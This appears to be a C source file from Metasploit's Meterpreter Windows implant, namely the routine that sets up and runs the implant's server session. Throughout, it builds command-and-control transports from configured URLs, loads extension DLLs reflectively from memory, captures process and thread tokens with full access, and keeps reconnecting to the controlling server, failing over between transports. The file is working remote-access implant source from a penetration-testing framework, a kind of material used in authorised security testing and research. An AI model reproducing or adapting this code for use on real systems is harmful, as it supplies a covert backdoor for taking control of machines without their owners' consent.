/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include <ws2tcpip.h>
#include "common_exports.h"

#include "server_transport_winhttp.h"
#include "server_transport_tcp.h"
#include "server_transport_named_pipe.h"
#include "packet_encryption.h"

extern Command* extensionCommands;

int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
{
	return EXCEPTION_EXECUTE_HANDLER;
}

/*!
 * @brief Get the session id that this meterpreter server is running in.
 * @return ID of the current server session.
 */
DWORD server_sessionid()
{
	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );

	static PROCESSIDTOSESSIONID processIdToSessionId = NULL;
	HMODULE kernel	 = NULL;
	DWORD sessionId = 0;

	do
	{
		if (!processIdToSessionId)
		{
			kernel = LoadLibraryA("kernel32.dll");
			if (kernel)
			{
				processIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress(kernel, "ProcessIdToSessionId");
			}
		}

		if (!processIdToSessionId)
		{
			break;
		}

		if (!processIdToSessionId(GetCurrentProcessId(), &sessionId))
		{
			sessionId = -1;
		}

	} while( 0 );

	if (kernel)
	{
		FreeLibrary(kernel);
	}

	return sessionId;
}

/*!
 * @brief Load any stageless extensions that might be present in the given configuration.
 * @param remote Pointer to the remote instance.
 * @param fd The socket descriptor passed to metsrv during intialisation.
 * @return Pointer to the end of the configuration.
 */
VOID load_stageless_extensions(Remote* remote, Packet* configPacket)
{
	DWORD index = 0;
	Tlv extensionTlv = { 0 };

	// start by loading the extensions before doing any init scripts
	while (packet_enum_tlv(configPacket, index, TLV_TYPE_EXTENSION, &extensionTlv) == ERROR_SUCCESS)
	{
		DWORD dllSize = 0;
		LPBYTE dll = packet_get_tlv_group_entry_value_raw(configPacket, &extensionTlv, TLV_TYPE_DATA, &dllSize);

		dprintf("[SERVER] Extension located at 0x%p: %u bytes", dll, dllSize);
		HMODULE hLibrary = LoadLibraryR(dll, dllSize, MAKEINTRESOURCEA(EXPORT_REFLECTIVELOADER));
		load_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
		++index;
	}

	dprintf("[SERVER] All stageless extensions loaded");

	// then iterate again and initialise those that require it.
	index = 0;
	while (packet_enum_tlv(configPacket, index, TLV_TYPE_EXTENSION, &extensionTlv) == ERROR_SUCCESS)
	{
		DWORD initSize = 0;
		PCHAR init = packet_get_tlv_group_entry_value_string(configPacket, &extensionTlv, TLV_TYPE_STRING, &initSize);
		if (init != NULL)
		{
			UINT extId = packet_get_tlv_group_entry_value_uint(configPacket, &extensionTlv, TLV_TYPE_UINT);
			dprintf("[STAGELESS] init data at %p, size %u, ID %u", init, initSize, extId);
			stagelessinit_extension(extId, init, initSize);
		}
		++index;
	}

	dprintf("[SERVER] All stageless extensions initialised");
}

static Transport* create_transport(Remote* remote, Packet* packet, Tlv* c2Tlv)
{
	PCHAR url = packet_get_tlv_group_entry_value_string(packet, c2Tlv, TLV_TYPE_C2_URL, NULL);
	Transport* transport = NULL;

	dprintf("[TRNS] Transport claims to have URL: %S", url);

	if (strncmp(url, "tcp", 3) == 0)
	{
		transport = transport_create_tcp(packet, c2Tlv);
	}
	else if (strncmp(url, "pipe", 4) == 0)
	{
		transport = transport_create_named_pipe(packet, c2Tlv);
	}
	else
	{
		transport = transport_create_http(packet, c2Tlv);
	}

	if (transport == NULL)
	{
		// something went wrong
		return NULL;
	}

	// always insert at the tail. The first transport will be the one that kicked everything off
	if (remote->transport == NULL)
	{
		// point to itself, as this is the first transport.
		transport->next_transport = transport->prev_transport = transport;
		remote->transport = transport;
	}
	else
	{
		transport->prev_transport = remote->transport->prev_transport;
		transport->next_transport = remote->transport;

		remote->transport->prev_transport->next_transport = transport;
		remote->transport->prev_transport = transport;
	}

	return transport;
}

static void append_transport(Transport** list, Transport* newTransport)
{
	if (*list == NULL)
	{
		// point to itself!
		newTransport->next_transport = newTransport->prev_transport = newTransport;
		*list = newTransport;
	}
	else
	{
		// always insert at the tail
		newTransport->prev_transport = (*list)->prev_transport;
		newTransport->next_transport = (*list);

		(*list)->prev_transport->next_transport = newTransport;
		(*list)->prev_transport = newTransport;
	}
}

static void remove_transport(Remote* remote, Transport* oldTransport)
{
	// if we point to ourself, then we're the last one
	if (remote->transport->next_transport == remote->transport)
	{
		remote->transport = NULL;
	}
	else
	{
		// if we're removing the current one we need to move the pointer to the
		// next one in the list.
		if (remote->transport == oldTransport)
		{
			remote->transport = remote->transport->next_transport;
		}

		oldTransport->prev_transport->next_transport = oldTransport->next_transport;
		oldTransport->next_transport->prev_transport = oldTransport->prev_transport;
	}

	oldTransport->transport_destroy(oldTransport);
}

static BOOL create_transports(Remote* remote, Packet* packet)
{
	DWORD index = 0;
	Tlv c2Tlv = { 0 };

	while (packet_enum_tlv(packet, index, TLV_TYPE_C2, &c2Tlv) == ERROR_SUCCESS)
	{
		create_transport(remote, packet, &c2Tlv);
		++index;
	}

	return TRUE;
}

static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LPDWORD size)
{
	dprintf("[METSRV] - config_create -- starting");
	UINT_PTR commsHandle = 0;
	Packet* configPacket = packet_create(PACKET_TLV_TYPE_CONFIG, 0);
	dprintf("[METSRV] - config_create -- created config packet");
	packet_add_tlv_uint(configPacket, TLV_TYPE_SESSION_EXPIRY, remote->sess_expiry_end ? remote->sess_expiry_end - current_unix_timestamp() : 0);
	dprintf("[METSRV] - config_create -- added Session Expiry");
	if (uuid == NULL)
	{
		uuid = remote->uuid;
	}
	packet_add_tlv_raw(configPacket, TLV_TYPE_UUID, uuid, UUID_SIZE);
	dprintf("[METSRV] - config_create -- added uuid");
	packet_add_tlv_raw(configPacket, TLV_TYPE_SESSION_GUID, remote->session_guid, sizeof(remote->session_guid));
	dprintf("[METSRV] - config_create -- added Session GUID");
	packet_add_tlv_uint(configPacket, TLV_TYPE_EXITFUNC, EXITFUNC_THREAD);
	dprintf("[METSRV] - config_create -- added exitfunc");

	if (remote->enc_ctx->valid && remote->enc_ctx->enabled)
	{
		// TODO OJ: confirm that it's worth doing this?
		packet_add_tlv_raw(configPacket, TLV_TYPE_SYM_KEY, remote->enc_ctx->key_data.key, remote->enc_ctx->key_data.length);
	}

	// Can't support DEBUG LOGGING during migration?

	Transport* current = remote->transport;
	Transport* t = remote->transport;
	do
	{
		if (t == current && t->get_handle != NULL)
		{
			commsHandle = t->get_handle(t);
			dprintf("[CONFIG] Comms handle set to %p", commsHandle);
		}
		dprintf("[METSRV] - config_create -- adding transport");
		t->write_config(t, configPacket);

		t = t->next_transport;
	} while (t != current);

	LPBYTE packetData = NULL;
	DWORD packetDataSize = 0;

	dprintf("[METSRV] - config_create -- transports done, serializing...");
	// serialize and xor the packet (config packets aren't encrypted)
	if (encrypt_packet(remote, configPacket, &packetData, &packetDataSize) == ERROR_SUCCESS)
	{
		dprintf("[METSRV] - config_create -- serialized, constructing config block");
		// put the final result in a config block
		*size = packetDataSize + sizeof(MetsrvConfig);
		*config = (MetsrvConfig*)calloc(1, *size);
		(*config)->comms_handle.handle = commsHandle;
		memcpy_s((*config)->config_packet, packetDataSize, packetData, packetDataSize);
	}

	if (packetData != NULL)
	{
		free(packetData);
	}

	packet_destroy(configPacket);
}

/*!
 * @brief Setup and run the server. This is called from Init via the loader.
 * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
 * @return Meterpreter exit code (ignored by the caller).
 */
DWORD server_setup(MetsrvConfig* config, Packet* configPacket)
{
	dprintf("[SERVER] server_setup running");

	THREAD* serverThread = NULL;
	Remote* remote = NULL;
	char stationName[256] = { 0 };
	char desktopName[256] = { 0 };
	DWORD res = 0;

	UINT sessionExpiry = packet_get_tlv_value_uint(configPacket, TLV_TYPE_SESSION_EXPIRY);
	dprintf("[SERVER] Expiry: %u", sessionExpiry);

	DWORD uuidSize = 0;
	PBYTE uuid = packet_get_tlv_value_raw(configPacket, TLV_TYPE_UUID, &uuidSize);

	dprintf("[SERVER] UUID: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
		uuid[0], uuid[1], uuid[2], uuid[3],
		uuid[4], uuid[5], uuid[6], uuid[7],
		uuid[8], uuid[9], uuid[10], uuid[11],
		uuid[12], uuid[13], uuid[14], uuid[15]);

	DWORD sessionGuidSize = 0;
	PBYTE sessionGuid = packet_get_tlv_value_raw(configPacket, TLV_TYPE_SESSION_GUID, &sessionGuidSize);
	if (sessionGuid != NULL)
	{
		dprintf("[SERVER] Session GUID: %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
			sessionGuid[0], sessionGuid[1], sessionGuid[2], sessionGuid[3],
			sessionGuid[4], sessionGuid[5], sessionGuid[6], sessionGuid[7],
			sessionGuid[8], sessionGuid[9], sessionGuid[10], sessionGuid[11],
			sessionGuid[12], sessionGuid[13], sessionGuid[14], sessionGuid[15]);
	}

	disable_thread_error_reporting();

	srand((unsigned int)time(NULL));

	__try
	{
		do
		{
			// Open a THREAD item for the servers main thread, we use this to manage migration later.
			serverThread = thread_open();

			dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm);

			if (!(remote = remote_allocate()))
			{
				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
				break;
			}

			memcpy_s(remote->uuid, sizeof(remote->uuid), uuid, uuidSize);
			if (sessionGuid != NULL)
			{
				memcpy_s(remote->session_guid, sizeof(remote->session_guid), sessionGuid, sizeof(remote->session_guid));
			}

			remote->sess_expiry_time = sessionExpiry;
			remote->sess_start_time = current_unix_timestamp();
			if (remote->sess_expiry_time)
			{
				remote->sess_expiry_end = remote->sess_start_time + remote->sess_expiry_time;
			}
			else
			{
				remote->sess_expiry_end = 0;
			}

			dprintf("[DISPATCH] Session going for %u seconds from %u to %u", remote->sess_expiry_time, remote->sess_start_time, remote->sess_expiry_end);

			if (!create_transports(remote, configPacket))
			{
				// not good, bail out!
				SetLastError(ERROR_BAD_ARGUMENTS);
				break;
			}

			DWORD keySize = 0;
			LPBYTE key = packet_get_tlv_value_raw(configPacket, TLV_TYPE_SYM_KEY, &keySize);
			if (key != NULL && keySize > 0)
			{
				dprintf("[DISPATCH] AES key provided in configuration, setting up!");
				create_enc_ctx_from_key(remote, key, keySize);
			}

			dprintf("[DISPATCH] Transport handle is %p", (LPVOID)config->comms_handle.handle);
			if (remote->transport->set_handle)
			{
				remote->transport->set_handle(remote->transport, config->comms_handle.handle);
			}

			// Set up the transport creation function pointer
			remote->trans_create = create_transport;
			// Set up the transport removal function pointer
			remote->trans_remove = remove_transport;
			// and the config creation pointer
			remote->config_create = config_create;

			// Store our thread handle
			remote->server_thread = serverThread->handle;

			dprintf("[SERVER] Registering dispatch routines...");
			register_dispatch_routines();
			
			// this has to be done after dispatch routine are registered
			load_stageless_extensions(remote, configPacket);

			// Store our process token
			if (!OpenThreadToken(remote->server_thread, TOKEN_ALL_ACCESS, TRUE, &remote->server_token))
			{
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &remote->server_token);
			}

			if (scheduler_initialize(remote) != ERROR_SUCCESS)
			{
				SetLastError(ERROR_BAD_ENVIRONMENT);
				break;
			}

			// Copy it to the thread token
			remote->thread_token = remote->server_token;

			// Save the initial session/station/desktop names...
			remote->orig_sess_id = server_sessionid();
			remote->curr_sess_id = remote->orig_sess_id;
			GetUserObjectInformationA(GetProcessWindowStation(), UOI_NAME, &stationName, 256, NULL);
			remote->orig_station_name = _strdup(stationName);
			remote->curr_station_name = _strdup(stationName);
			GetUserObjectInformationA(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &desktopName, 256, NULL);
			remote->orig_desktop_name = _strdup(desktopName);
			remote->curr_desktop_name = _strdup(desktopName);

			remote->sess_start_time = current_unix_timestamp();

			dprintf("[SERVER] Time to kick off connectivity to MSF ...");
			// loop through the transports, reconnecting each time.
			while (remote->transport)
			{
				if (remote->transport->transport_init)
				{
					dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport);
					// Each transport has its own set of retry settings and each should honour
					// them individually.
					if (remote->transport->transport_init(remote->transport) != ERROR_SUCCESS)
					{
						dprintf("[SERVER] transport initialisation failed, moving to the next transport");
						remote->transport = remote->transport->next_transport;

						// when we have a list of transports, we'll iterate to the next one.
						continue;
					}
				}

				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
				DWORD dispatchResult = remote->transport->server_dispatch(remote, serverThread);

				dprintf("[DISPATCH] dispatch exited with result: %u", dispatchResult);
				if (remote->transport->transport_deinit)
				{
					dprintf("[DISPATCH] deinitialising transport");
					remote->transport->transport_deinit(remote->transport);
				}

				dprintf("[TRANS] resetting transport");
				if (remote->transport->transport_reset)
				{
					remote->transport->transport_reset(remote->transport, dispatchResult == ERROR_SUCCESS && remote->next_transport == NULL);
				}

				// If the transport mechanism failed, then we should loop until we're able to connect back again.
				if (dispatchResult == ERROR_SUCCESS)
				{
					dprintf("[DISPATCH] Server requested shutdown of dispatch");
					// But if it was successful, and this is a valid exit, then we should clean up and leave.
					if (remote->next_transport == NULL)
					{
						dprintf("[DISPATCH] No next transport specified, leaving");
						// we weren't asked to switch transports, so we exit.
						break;
					}

					// we need to change transports to the one we've been given. We will assume, for now,
					// that the transport has been created using the appropriate functions and that it is
					// part of the transport list.
					dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->next_transport);
					remote->transport = remote->next_transport;
					remote->next_transport = NULL;
				}
				else
				{
					// move to the next one in the list
					dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->transport->next_transport);
					remote->transport = remote->transport->next_transport;
				}

				// transport switching and failover both need to support the waiting functionality.
				if (remote->next_transport_wait > 0)
				{
					dprintf("[TRANS] Sleeping for %u seconds ...", remote->next_transport_wait);

					sleep(remote->next_transport_wait);

					// the wait is a once-off thing, needs to be reset each time
					remote->next_transport_wait = 0;
				}
			}

			// clean up the transports
			while (remote->transport)
			{
				remove_transport(remote, remote->transport);
			}

			// if we had an encryption context we should clear it up.
			free_encryption_context(remote);

			dprintf("[SERVER] Deregistering dispatch routines...");
			deregister_dispatch_routines(remote);
		} while (0);

		dprintf("[DISPATCH] calling scheduler_destroy...");
		scheduler_destroy();

		dprintf("[DISPATCH] calling command_join_threads...");
		command_join_threads();

		remote_deallocate(remote);
	}
	__except (exceptionfilter(GetExceptionCode(), GetExceptionInformation()))
	{
		dprintf("[SERVER] *** exception triggered!");

		thread_kill(serverThread);
	}

	dprintf("[SERVER] Finished.");
	return res;
}
